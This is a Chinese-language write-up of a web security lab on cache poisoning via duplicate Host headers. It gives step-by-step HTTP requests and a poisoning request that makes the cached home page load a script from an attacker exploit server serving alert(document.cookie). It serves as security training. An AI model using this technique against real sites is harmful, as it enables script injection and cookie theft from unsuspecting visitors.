# 实验室：通过模糊请求进行 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞，原因是缓存和后端应用程序在处理模糊请求（ambiguous requests）时存在差异。一名不知情用户会定期访问网站首页。

要解决本实验室，请投毒缓存，使首页在受害者浏览器中执行 `alert(document.cookie)`。


## 步骤

侦察
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: 0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/1.1 200 OK
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 1
        X-Cache: hit

        <script type="text/javascript" src="//0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net/resources/js/tracking.js">
        </script>
        ```
    - 首页被缓存
    - 之后测试 Host 头或 URL 反射
    - 查看 JS 脚本

- 查看 JS 脚本
    ```http
    GET /resources/js/tracking.js HTTP/1.1
    Host: 0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/1.1 200 OK
        Content-Type: application/javascript; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Connection: close
        Content-Length: 70

        document.write('<img src="/resources/images/tracker.gif?page=post">');
        ```

- 查看图片端点
    ```http
    GET /resources/images/tracker.gif?page=post HTTP/1.1
    Host: 0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/1.1 200 OK
        Content-Type: image/gif
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=30
        Age: 0
        X-Cache: miss
        Connection: close
        Content-Length: 42

        GIF89a
        ```

手动测试 Host 头或使用参数挖掘扩展
- 首页的覆盖 Host 头部探测，无有趣条目
- 尝试混淆 Host 头
    ```http
    GET /?122 HTTP/1.1
    Host: 0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net
    Host: xx
    ```

    - 响应
        ```html
        <script type="text/javascript" src="//xx/resources/js/tracking.js">
        </script>
        ```

    - 双重 Host 头时，前端使用第一个，后端使用第二个动态构建 URL

构建 Web 缓存投毒
- 攻击者端点
    `exploit-0a1b001d0355818a8013437c01760019.exploit-server.net/resources/js/tracking.js`

- 攻击者端点内容
    ```js
    alert(document.cookie)
    ```

- 投毒请求
    ```http
    GET / HTTP/1.1
    Host: 0a2600e8032e8182807f442d00a300c4.h1-web-security-academy.net
    Host: exploit-0a1b001d0355818a8013437c01760019.exploit-server.net
    ```

    - 响应
        ```html
        <script type="text/javascript" src="//exploit-0a1b001d0355818a8013437c01760019.exploit-server.net/resources/js/tracking.js"></script>
        ```
